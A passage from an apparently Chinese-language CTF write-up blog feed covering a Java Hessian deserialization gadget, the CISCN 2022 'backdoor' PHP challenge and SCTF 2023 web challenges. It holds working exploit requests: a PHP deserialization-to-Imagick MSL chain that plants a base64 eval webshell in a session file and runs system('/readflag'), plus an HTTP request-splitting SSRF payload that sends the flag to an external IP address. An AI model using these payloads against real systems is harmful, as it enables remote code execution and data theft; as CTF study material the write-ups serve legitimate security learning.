class_">Hessian2Input</span>(bais);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>个人理解</strong></p><p>在序列化的时候<img src="../images/image-20230706214832344.png" alt="image-20230706214832344"></p><p>这个回执行里面的方法来奖上面的<code>templatesimpl</code>给序列化掉</p><p>然后在反序列化的时候</p><p><img src="../images/image-20230706214927202.png" alt="image-20230706214927202"></p><p>这个方法会调用任意<code>getter</code>方法  然后就会调用到<code>SignedObject</code>里面的<code>getObject</code>方法</p><p><img src="../images/image-20230706215135347.png" alt="image-20230706215135347"></p><p>然后就会执行反序列化操作  最后执行恶意代码</p><p><img src="../images/image-20230706215244806.png" alt="image-20230706215244806"></p><h3 id="Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）"><a href="#Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）" class="headerlink" title="Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）"></a>Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）</h3><p>这里的话了解就行  因为搭建环境比较麻烦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://goodapple.top/archives/1193&quot;&gt;文章1&lt;/a&gt;    &lt;a href=&quot;https://su18.org/post/hessian/#xbean&quot;&gt;文章2&lt;/a&gt;  &lt;a href=&quot;https://juejin.</summary>
      
    
    
    
    
    <category term="java-Hessian" scheme="https://ke1nys.github.io/tags/java-Hessian/"/>
    
  </entry>
  
  <entry>
    <title>ciscn决赛-2022-backdoor</title>
    <link href="https://ke1nys.github.io/posts/869a12bf.html"/>
    <id>https://ke1nys.github.io/posts/869a12bf.html</id>
    <published>2023-06-21T07:58:09.000Z</published>
    <updated>2023-06-21T08:41:22.393Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/">题目wp</a></p><p><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">题目中关键的利用知识点</a></p><p><a href="https://github.com/AFKL-CUIT/CTF-Challenges/tree/master">这里面有backdoor的docker容器</a></p><p>这里写这篇文章的目的是来加深对这道题的理解</p><p><strong>题目源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;stdclass&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;path)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;__sleep failed...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;do_exec_func &amp;&amp; </span><br><span class="line">                <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>, <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">            ) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">                <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>); // 没有<span class="title">echo</span></span></span><br><span class="line"><span class="class">            &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">cmd</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">cmd</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">data</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">data</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">switch</span> ($<span class="title">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读代码，存在两个魔法函数：</p><ul><li><code>__sleep()</code>，执行serialize()时，先会调用这个函数。这里可以实现任意文件包含。</li><li><code>__wakeup()</code>，执行unserialize()时，先会调用这个函数。这里可以执行一次无参函数结构。</li></ul><p>对于<code>__sleep__</code>来说，如果我们能够包含临时文件或者session即可rce。</p><p>目前的思路就有了，我们能够通过回调函数调用<code>session_start</code>，这里会触发序列化操作，如果我们能够控制session内容，那么就可以触发<code>__sleep</code>函数进行文件包含达成rce。接下来的目标则是想办法控制session内容。</p><p>(<strong>这个<code>session_start</code>是关键，在开启这个的时候会自动进行序列化，就是将session里的值进行序列化后存入存储介质中，然后因为访问了session中的数据，会自动将session中的值进行反序列化操作</strong>)</p><p><img src="../images/image-20230621160515951.png" alt="image-20230621160515951"></p><p>(<strong>是先进行—-反序列化—-在进行—-序列化—-操作</strong>)</p><p>对于<code>__wakeup__</code>来说，我们可以执行一次php内部类，那么我们可以利用此来探测信息</p><p>构造反序列化payload查看phpinfo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621162803997.png" alt="image-20230621162803997"></p><p>发现imagick拓展，想起之前看过的文章<a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">exploiting-arbitrary-object-instantiations</a>，文章讲述了针对以下结构的php代码的一种攻击方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>再查看一下<code>__wakeup</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (</span><br><span class="line">               <span class="variable language_">$this</span>-&gt;do_exec_func &amp;&amp; </span><br><span class="line">               <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>, <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">           ) &#123;</span><br><span class="line">                   <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">               <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">               </span></span><br><span class="line"><span class="class">               <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>); </span></span><br><span class="line"><span class="class">           &#125;</span></span><br><span class="line"><span class="class">   &#125;</span></span><br></pre></td></tr></table></figure><p>一方面题目给了同类型代码，另一方面题目限制了通过内置类的利用，显然我们需要利用<code>imagick</code>的特性进行攻击</p><p><code>imagick</code>类在初始化时可以执行<code>Magick Scripting Language</code>。那么考虑用其特性，在临时文件中写入<code>Magick Scripting Language</code>，然后在<code>imagick</code>类<strong>初始化的时候执行临时文件并且写入<code>session</code>文件</strong>。再触发<code>__sleep</code>包含<code>session</code>文件以<code>RCE</code>。</p><p>首先利用网站提供的功能，删除<code>/tmp</code>下的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:9999/?cmd=rm</span></span><br></pre></td></tr></table></figure><p>接下来发包写入session</p><p>构造反序列化数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="string">&quot;vid:msl:/tmp/php*&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;imagick&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p><strong>最后在反序列化的时候是会执行这样</strong>  <code>new imagick(&quot;vid:msl:/tmp/php*&quot;)</code></p><p>发包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?data=O%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backdoor%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>path%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>argv%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>vid%<span class="number">3</span>Amsl%<span class="number">3</span>A%<span class="number">2</span>Ftmp%<span class="number">2</span>Fphp*%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>imagick%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>do_exec_func%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>B%<span class="number">7</span>D&amp;cmd=unserialze HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9999</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Content-Length: 703</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------c32aaddf3d8fd979</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------c32aaddf3d8fd979</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;swarm&quot;; filename=&quot;swarm.msl&quot;</span></span><br><span class="line"><span class="comment">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;image&gt;</span></span><br><span class="line"><span class="comment"> &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot; /&gt;</span></span><br><span class="line"><span class="comment"> &lt;write filename=&quot;/tmp/sess_snakin&quot; /&gt;</span></span><br><span class="line"><span class="comment">&lt;/image&gt;</span></span><br><span class="line"><span class="comment">--------------------------c32aaddf3d8fd979--</span></span><br></pre></td></tr></table></figure><p>这里就是强制文件上传    <code>xml</code>这些内容就会上传到<code>/tmp/php*</code>   临时文件下  </p><p>接着因为<code>new imagick(&quot;vid:msl:/tmp/php*&quot;)</code>  初始会执行<code>msl</code>语言，所以临时文件里的内容就会被执行  </p><p>就是将序列化好的字符进行base64编码  然后传入<code>/tmp/sess_snakin</code>下</p><p><img src="../images/image-20230621163522068.png" alt="image-20230621163522068"></p><p>随后使用执行一次任意无参函数的功能，触发<code>session_start</code>函数，并设置<code>cookie</code>为<code>PHPSESSID=snakin</code>，即可文件包含<code>session</code>，成功<code>RCE</code>。<code>flag</code>执行根目录的<code>readflag</code>即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /?data=O%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backdoor%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>session_start%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>do_exec_func%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D&amp;cmd=unserialze&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;/readflag&#x27;</span>); HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9999</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=snakin</span></span><br></pre></td></tr></table></figure><p>上面的传的序列化字符就是为了开启<code>session_start()</code>的</p><p><strong>然后就会进行反序列化将path给赋值，反序列化完后再进行序列化，将序列化后的执行存入存储介质中 因为session文件中含有php代码，包含的时候就会执行</strong>  </p><p>上面就是<code>imagick</code>配合<code>session</code>进行rce的过程了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/&quot;&gt;题目wp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://swarm.ptsecurity.com/exploiting</summary>
      
    
    
    
    
    <category term="ciscn决赛-2022-backdoor" scheme="https://ke1nys.github.io/tags/ciscn%E5%86%B3%E8%B5%9B-2022-backdoor/"/>
    
  </entry>
  
  <entry>
    <title>sctf-web-2023</title>
    <link href="https://ke1nys.github.io/posts/99a58670.html"/>
    <id>https://ke1nys.github.io/posts/99a58670.html</id>
    <published>2023-06-20T09:28:27.000Z</published>
    <updated>2023-06-24T13:50:21.839Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ezcheck1n"><a href="#ezcheck1n" class="headerlink" title="ezcheck1n"></a><strong>ezcheck1n</strong></h2><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/hint提示是</span><br><span class="line"></span><br><span class="line">find the way to flag.Looks like there are two containers with an evil P in the configuration file of the frontend server</span><br><span class="line"></span><br><span class="line">去寻找flag在哪</span><br><span class="line"></span><br><span class="line">他看来有两个路由有P在配置文件中</span><br><span class="line"></span><br><span class="line">nss的考点中有</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>后端是 Server: Apache/2.4.54 (Debian) 中间件是 Server: Apache/2.4.55 (Unix)</strong></p><p><strong>这就是题目提示的两个容器的意思</strong></p><p><img src="../images/image-20230620194824661.png" alt="image-20230620194824661"></p><p>但是试了一下  发现不行  就没往这方面想了   没想到的最后wp里还是用它</p><p>(就是在其基础上修改一下就行了)</p><p><img src="../images/image-20230620195107173.png" alt="image-20230620195107173"></p><p><strong>题目就是提示了这几点  <code>post</code>指的是<code>post.jpeg</code>  然后就会看到下面的这个2022</strong></p><p>(就是当时想不明白这个url有啥用。。。。。。。)</p><p>这里的<code>url</code>是用来ssrf然后将flag带出到自己的vps监听端口上</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/2023/1%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/2022.php%3furl%3d101.42.39.110:3389%253fa%253d</span><br></pre></td></tr></table></figure><p>这里的<code>2022.php</code>是猜出来的，因为题目给了是<code>show_source(2023.php)</code>   然后图片给的是2022，使用就是靠这里猜出来的</p><p><img src="../images/image-20230620201530382.png" alt="image-20230620201530382"></p><p><img src="../images/image-20230620201513988.png" alt="image-20230620201513988"></p><h2 id="fumo-backdoor"><a href="#fumo-backdoor" class="headerlink" title="fumo_backdoor"></a>fumo_backdoor</h2><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FUMO在你的网站上留下了后门 ᗜˬᗜ，她是怎么使用这个后门的捏？ ᗜˬᗜ（flag 在 /flag）</span><br></pre></td></tr></table></figure><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="keyword">__DIR__</span>.<span class="string">&quot;:/tmp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;FUNC_LIST&quot;</span>, <span class="title function_ invoke__">get_defined_functions</span>());</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fumo_backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;path) &amp;&amp; </span><br><span class="line">            <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[flag]/m&#x27;</span>, <span class="variable">$this</span>-&gt;path) === <span class="number">0</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="title function_ invoke__">is_string</span>(<span class="variable">$func</span>) &amp;&amp; </span><br><span class="line">            <span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, FUNC_LIST[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">            <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">cmd</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">cmd</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">data</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">data</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">switch</span> ($<span 